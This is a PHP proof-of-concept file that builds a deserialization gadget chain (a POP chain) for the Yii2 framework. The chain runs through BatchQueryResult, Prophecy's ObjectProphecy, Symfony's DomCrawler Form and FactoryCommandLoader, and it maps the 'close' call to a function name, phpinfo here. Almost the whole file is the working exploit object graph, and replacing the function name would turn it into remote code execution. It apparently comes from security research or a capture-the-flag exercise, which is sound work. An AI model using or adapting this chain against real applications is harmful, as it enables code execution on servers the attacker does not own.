<?php

namespace yii\db
{
    class BatchQueryResult
    {
        private $_dataReader;

        function __construct()
        {
            $this->_dataReader = new \Prophecy\Prophecy\ObjectProphecy();
        }
    }
}

namespace Prophecy\Prophecy
{
    class ObjectProphecy
    {
        private $methodProphecies;
        private $revealer;

        function __construct()
        {
            $this->revealer = new Revealer();
            $this->methodProphecies = new \Symfony\Component\DomCrawler\Form();
        }
    }

    class Revealer{

        function __construct()
        {
            
        }
    }
}

namespace Symfony\Component\DomCrawler
{
    class Form
    {
        private $fields;

        function __construct()
        {
            $this->fields = new \Symfony\Component\Console\CommandLoader\FactoryCommandLoader();
        }
    }
}

namespace Symfony\Component\Console\CommandLoader
{
    class FactoryCommandLoader
    {
        private $factories = ["close"=>"phpinfo"];

        function __construct()
        {
            
        }
    }
}